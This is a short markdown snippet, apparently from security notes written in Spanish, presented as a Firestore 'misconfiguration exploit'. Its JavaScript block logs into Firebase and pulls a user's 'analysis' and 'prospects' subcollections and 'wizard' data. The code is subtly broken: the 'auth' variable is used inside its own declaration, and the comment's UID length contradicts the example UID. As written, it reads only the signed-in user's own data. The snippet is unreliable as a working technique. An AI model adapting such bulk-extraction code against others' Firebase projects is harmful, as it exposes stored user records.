## 🔥 CÓDIGO ATRAZ: MISCONFIGURATION EXPLOIT

### Pattern 1: User UID Extraction
```javascript
// 1. Login y obtener UID
const auth = await signInWithEmailAndPassword(auth, email, pwd);
const uid = auth.user.uid;  // 18 chars (ej: 3mKns0kgXpTzepXF2T7a18PMT233)

// 2. Extraer todos los docs públicos de users/{uid}/analysis
const analysisDocs = await getDocs(collection(
  db, 
  "users", 
  uid, 
  "analysis"
));

// 3. Extraer todos los docs públicos de users/{uid}/prospects
const prospectsDocs = await getDocs(collection(
  db, 
  "users", 
  uid, 
  "prospects"
));

// 4. Extraer wizard (actual analysis)
const wizardDoc = await getDoc(doc(db, "users", uid));
const wizard = wizardDoc.data().wizard;
```

